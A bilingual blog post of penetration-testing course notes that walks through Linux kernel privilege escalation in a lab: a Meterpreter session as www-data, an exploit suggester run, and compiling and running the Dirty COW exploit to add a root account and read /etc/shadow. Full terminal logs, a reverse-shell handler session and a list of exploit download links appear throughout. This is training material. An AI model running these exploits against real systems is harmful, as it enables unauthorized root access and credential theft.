---
layout: post
title: "Linux Kernel Exploits"
date: "2022-10-27"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Host & Network Penetration Testing
    - System/Host Based Attacks
---

# Linux Kernel Exploits
## Linux Kernel Exploitation
Kernel exploits on Linux will typically target vulnerabilities in the Linux kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell.

This process will differ based on the Kernel version and distribution being targeted and the kernel exploit being used.

Privilege escalation on Linux systems will typically follow the following methodology:
* Identifying kernel vulnerabilities
* Downloading, compiling and transferring kernel exploits onto the target system.

## Tools & Environment
Linux-Exploit-Suggester - This tool is designed to assist in detecting security deficiencies for given Linux kernel/Linux-based machine. It assesses (Using heuristics methods) the exposure of the given kernel on every publicly known Linux kernel exploit.

GitHub: https://github.com/mzet-/linux-exploit-suggester

Note: The techniques demonstrated in this video are performed on an Ubuntu 12.04 VM.

# Linux 内核漏洞利用
## Linux 内核利用
Linux 上的内核利用通常会针对 Linux 内核中的漏洞执行任意代码，以运行特权系统命令或获取系统 shell。

此过程将根据内核版本和目标发行版以及所使用的内核漏洞利用而有所不同。

Linux 系统上的权限提升通常遵循以下方法：
* 识别内核漏洞
* 下载、编译和传输内核漏洞到目标系统。

## 工具与环境
Linux-Exploit-Suggester - 此工具旨在帮助检测给定 Linux 内核/基于 Linux 的机器的安全缺陷。它评估（使用启发式方法）给定内核对每个公开已知的 Linux 内核漏洞的暴露程度。
GitHub：https://github.com/mzet-/linux-exploit-suggester

注意：本视频中演示的技术是在 Ubuntu 12.04 VM 上执行的。

## Video
Perform some local enumeration:

```
meterpreter > sysinfo
```

What are the current privileges:

I'm currently logoned on or currently access to the target system with the privilege associated with user account `www-data`. This is a service account that you typically find on Linux system that have a Web server, or that hosting a Web server. This is a service account because it's used to manage the actual Web server will be Apache or Ngnix. And it is generally speaking, unprivileged. It gives the fact that if you exploit the Web application or Web server, then this account is a safeguard and as a result, it is not a part of the sudo group or any administrative group on the Linux system and cannot execute any commands that require root privileges.

```
meterpreter > getuid
Server username: www-data
```

Verify this by opening up a shell session, and obtain a bash session here. List out the groups that www-data is a part of. It' only a part of it's own group. List out the user. If we try to update the repositary, it's going to ask for a password, but because it is a service acount, it's going to tell us right over here. It means we need to elevate our privilege, we are targeting a root account, as that is the account with highest privileges on a Linux system.

```
meterpreter > shell
/bin/bash -i
www-data@ubuntu:/tmp$ groups www-data
www-data@ubuntu:/tmp$ cat /etc/passwd
www-data@ubuntu:/tmp$ sudo apt-get update
sudo: no tty present and no askpass program sprcified
Sorry, try agian.
www-data@ubuntu:/tmp$ ^C
```

The way we are going to obatin root access is to use of the kernel vulnerability, kernel exploits.

[linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)

Navigate to the `/tmp` directory within the Linux file system. It is a directory that stored the temporary file.

```
meterpreter > cd /tmp
meterpreter > ls
meterpreter > upload ~/Desktop/Linux-Enum/les.sh
meterpreter > shell
/bin/bash -i
www-data@ubuntu:/tmp$ ls
www-data@ubuntu:/tmp$ chmod +x les.sh
www-data@ubuntu:/tmp$ ls -alps
www-data@ubuntu:/tmp$ ./les.sh
www-data@ubuntu:/tmp$ ^C
```

[Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)](https://www.exploit-db.com/exploits/40839)

[CVE-2016-5195](https://dirtycow.ninja/)

Download the exploit code from the ExploitDB.

In terms of compilation of the actual exploits, there are few techniques that can be used, the first technique is to compile locally on Kali Linux, or you can transfer it over to the target system and complile it on that system. 

```
sudo apt-get install gcc
```

```
cd Downloads
mv 40839.c dirty.c
ls
gcc -pthread dirty.c -o dirty -lcrypt
ls
```

Tranfer this over to the target system. Let's see wether it works. If it dosen't work, we will need to compile the C code on the target system.

```
meterpreter > upload ~/Download/dirty
meterpreter > shell
/bin/bash -i
www-data@ubuntu:/tmp$ ls
www-data@ubuntu:/tmp$ chmod +x dirty
www-data@ubuntu:/tmp$ ./dirty password123
```

We get a few errors here, this is because the exploit code was not compiled on that system.

```
www-data@ubuntu:/tmp$ rm dirty
www-data@ubuntu:/tmp$ ^C
```

```
meterpreter > upload ~/Downloads/dirty.c
meterpreter > shell
/bin/bash -i
www-data@ubuntu:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
www-data@ubuntu:/tmp$ ls
www-data@ubuntu:/tmp$ chmod +x dirty
www-data@ubuntu:/tmp$ ./dirty password123
www-data@ubuntu:/tmp$ cat /etc/passwd
www-data@ubuntu:/tmp$ su firefart
```

Login with ssh. List out the file that is only accessible by root user or users with root privileges, like the `/etc/shadow` file.

```
ssh firefart@10.10.10.15
firefart@ubuntu:~# sudo apt-get update
firefart@ubuntu:~# apt-get update
firefart@ubuntu:~# whoami
firefart@ubuntu:~# cat /etc/shadow
```

That is how to elevate your privilegs on a Linux system through the use of kernel exploit.

# Home Lab
Target:
```
192.168.248.128
```

[OpenSSH Server](https://ubuntu.com/server/docs/service-openssh)

[Install and Configure Apache](https://ubuntu.com/tutorials/install-and-configure-apache#1-overview)

[How to copy files from one machine to another using ssh](https://unix.stackexchange.com/questions/106480/how-to-copy-files-from-one-machine-to-another-using-ssh)

[MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter)](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)

[Logining into www-data](https://ubuntuforums.org/showthread.php?t=2280551)

```
┌──(root㉿kali)-[~]
└─# nmap -sV 192.168.248.131
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-27 04:27 EDT
Nmap scan report for 192.168.248.131
Host is up (0.000053s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
MAC Address: 00:0C:29:94:C0:38 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.52 seconds

```

```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 192.168.248.148:1234 
[*] Sending stage (3020772 bytes) to 192.168.248.131
[*] Meterpreter session 2 opened (192.168.248.148:1234 -> 192.168.248.131:47892) at 2022-10-27 04:38:38 -0400

meterpreter > sysinfo
Computer     : ubuntu-14.04.6
OS           : Ubuntu 14.04 (Linux 4.4.0-142-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > getuid
Server username: www-data
meterpreter > shell
Process 3389 created.
Channel 1 created.
/bin/bash -i
www-data@ubuntu-14:/opt/exploits$ whoami
whoami
www-data
www-data@ubuntu-14:/opt/exploits$ groups www-data
groups www-data
www-data : www-data
www-data@ubuntu-14:/opt/exploits$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
landscape:x:103:109::/var/lib/landscape:/bin/false
phos:x:1000:1000:phos,,,:/home/phos:/bin/bash
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
www-data@ubuntu-14:/opt/exploits$ cat /etc/shadow
cat /etc/shadow
cat: /etc/shadow: Permission denied
```

```
meterpreter > cd /tmp
meterpreter > upload /root/Linux/Enum/linux-exploit-suggester/linux-exploit-suggester.sh
[*] uploading  : /root/Linux/Enum/linux-exploit-suggester/linux-exploit-suggester.sh -> linux-exploit-suggester.sh
[*] Uploaded -1.00 B of 88.79 KiB (-0.0%): /root/Linux/Enum/linux-exploit-suggester/linux-exploit-suggester.sh -> linux-exploit-suggester.sh
[*] uploaded   : /root/Linux/Enum/linux-exploit-suggester/linux-exploit-suggester.sh -> linux-exploit-suggester.sh
meterpreter > shell
Process 3424 created.
Channel 1 created.
/bin/bash -i
www-data@ubuntu-14:/tmp$ ls -al
ls -al
total 100
drwxrwxrwt  2 root     root      4096 Oct 27 13:45 .
drwxr-xr-x 22 root     root      4096 Oct 27 10:36 ..
-rw-rw-r--  1 www-data www-data 90917 Oct 27 13:45 linux-exploit-suggester.sh
www-data@ubuntu-14:/tmp$ chmod +x linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
```

```
www-data@ubuntu-14:/tmp$ ./linux-exploit-suggester.sh
./linux-exploit-suggester.sh

Available information:

Kernel version: 4.4.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: 14.04
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
Package listing: from current OS

Searching among:

81 kernel space exploits
49 user space exploits

Possible Exploits:

cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
[+] [CVE-2017-16995] eBPF_verifier

   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
   Exposure: highly probable
   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,[ ubuntu=14.04 ]{kernel:4.4.0-89-generic},ubuntu=(16.04|17.04){kernel:4.(8|10).0-(19|28|45)-generic}
   Download URL: https://www.exploit-db.com/download/45010
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2017-1000112] NETIF_F_UFO

   Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
   Exposure: highly probable
   Tags: [ ubuntu=14.04{kernel:4.4.0-*} ],ubuntu=16.04{kernel:4.8.0-*}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
   Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2017-6074] dccp

   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
   Download URL: https://www.exploit-db.com/download/41458
   Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

[+] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

[+] [CVE-2016-2384] usb-midi

   Details: https://xairy.github.io/blog/2016/cve-2016-2384
   Exposure: probable
   Tags: [ ubuntu=14.04 ],fedora=22
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

[+] [CVE-2015-3202] fuse (fusermount)

   Details: http://seclists.org/oss-sec/2015/q2/520
   Exposure: probable
   Tags: debian=7.0|8.0,[ ubuntu=* ]
   Download URL: https://www.exploit-db.com/download/37089
   Comments: Needs cron or system admin interaction

[+] [CVE-2015-1318] newpid (apport)

   Details: http://openwall.com/lists/oss-security/2015/04/14/4
   Exposure: probable
   Tags: [ ubuntu=14.04 ]
   Download URL: https://gist.githubusercontent.com/taviso/0f02c255c13c5c113406/raw/eafac78dce51329b03bea7167f1271718bee4dcc/newpid.c

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2019-18634] sudo pwfeedback

   Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
   Exposure: less probable
   Tags: mint=19
   Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
   Comments: sudo configuration requires pwfeedback to be enabled.

[+] [CVE-2019-15666] XFRM_UAF

   Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
   Exposure: less probable
   Download URL: 
   Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required

[+] [CVE-2017-7308] af_packet

   Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
   Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154

[+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

   Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
   Exposure: less probable
   Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
   Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
   Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

[+] [CVE-2017-1000253] PIE_stack_corruption

   Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
   Exposure: less probable
   Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
   Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

[+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

   Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
   Exposure: less probable
   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
   Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

[+] [CVE-2016-4557] double-fdput()

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/bin-sploits/39772.zip
   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

[+] [CVE-2015-1318] newpid (apport) 2

   Details: http://openwall.com/lists/oss-security/2015/04/14/4
   Exposure: less probable
   Tags: ubuntu=14.04.2
   Download URL: https://www.exploit-db.com/download/36782

[+] [CVE-2016-0728] keyring

   Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
www-data@ubuntu-14:/tmp$    Exposure: less probable
   Download URL: https://www.exploit-db.com/download/40003
   Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working
```

[Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)](https://www.exploit-db.com/exploits/40839)

```
┌──(root㉿kali)-[~/Downloads]
└─# mv 40839.c dirty.c                                                                                   
                                                                                                                                                                                             
┌──(root㉿kali)-[~/Downloads]
└─# ls
dirty.c
                                                                                                                                                                                             
┌──(root㉿kali)-[~/Downloads]
└─# gcc -pthread dirty.c -o dirty -lcrypt                           
                                                                                                                                                                                             
┌──(root㉿kali)-[~/Downloads]
└─# ls
dirty  dirty.c
```

```
meterpreter > pwd
/tmp
meterpreter > upload /root/Downloads/dirty
[*] uploading  : /root/Downloads/dirty -> dirty
[*] Uploaded -1.00 B of 17.27 KiB (-0.01%): /root/Downloads/dirty -> dirty
[*] uploaded   : /root/Downloads/dirty -> dirty
meterpreter > shell
Process 6726 created.
Channel 1 created.
/bin/bash -i
www-data@ubuntu-14:/tmp$ whoami
whoami
www-data
www-data@ubuntu-14:/tmp$ chmod +x dirty
chmod +x dirty
www-data@ubuntu-14:/tmp$ ./dirty
./dirty
./dirty: /lib/x86_64-linux-gnu/libcrypt.so.1: version `XCRYPT_2.0' not found (required by ./dirty)
./dirty: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.33' not found (required by ./dirty)
www-data@ubuntu-14:/tmp$ ls  
ls
dirty
linux-exploit-suggester.sh
www-data@ubuntu-14:/tmp$ rm dirty
rm dirty
```

```
meterpreter > upload /root/Downloads/dirty.c
[*] uploading  : /root/Downloads/dirty.c -> dirty.c
[*] Uploaded -1.00 B of 4.89 KiB (-0.02%): /root/Downloads/dirty.c -> dirty.c
[*] uploaded   : /root/Downloads/dirty.c -> dirty.c
meterpreter > getuid
Server username: www-data
meterpreter > cd /tmp
meterpreter > shell
Process 10811 created.
Channel 1 created.
/bin/bash -i
www-data@ubuntu-14:/tmp$ ls -al
ls -al
total 108
drwxrwxrwt  2 root     root      4096 Oct 27 15:21 .
drwxr-xr-x 22 root     root      4096 Oct 27 10:36 ..
-rw-rw-r--  1 www-data www-data  5006 Oct 27 15:11 dirty.c
-rwxrwxr-x  1 www-data www-data 90917 Oct 27 13:45 linux-exploit-suggester.sh
www-data@ubuntu-14:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
gcc -pthread dirty.c -o dirty -lcrypt
www-data@ubuntu-14:/tmp$ ls -al
ls -al
total 124
drwxrwxrwt  2 root     root      4096 Oct 27 15:25 .
drwxr-xr-x 22 root     root      4096 Oct 27 10:36 ..
-rwxrwxr-x  1 www-data www-data 14310 Oct 27 15:25 dirty
-rw-rw-r--  1 www-data www-data  5006 Oct 27 15:11 dirty.c
-rwxrwxr-x  1 www-data www-data 90917 Oct 27 13:45 linux-exploit-suggester.sh
www-data@ubuntu-14:/tmp$ ./dirty password123
./dirty password123
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: password123
Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

mmap: 7f6dfe526000
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'password123'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
www-data@ubuntu-14:/tmp$ /etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: password123
Complete line:
firefart:fi1IpG9ta02N.:0:0:pwned:/root:/bin/bash

mmap: 7f6dfe526000
madvise 0

Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password 'password123'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

虽然执行成功，但是却没有创建名为firefart的用户，可能是内核版本不符合要求。

ExploitDB中要求的系统版本是：Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation 

而目标的内核是`Linux ubuntu-14 4.4.0-142-generic`。

```
www-data@ubuntu-14:/tmp$ uname -a
uname -a
Linux ubuntu-14 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
```

[Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation](https://www.exploit-db.com/exploits/45010)

提权失败。

[Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)](https://www.exploit-db.com/exploits/43418)

无法识别内核版本。

[Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Method)](https://www.exploit-db.com/exploits/40611)

提权失败。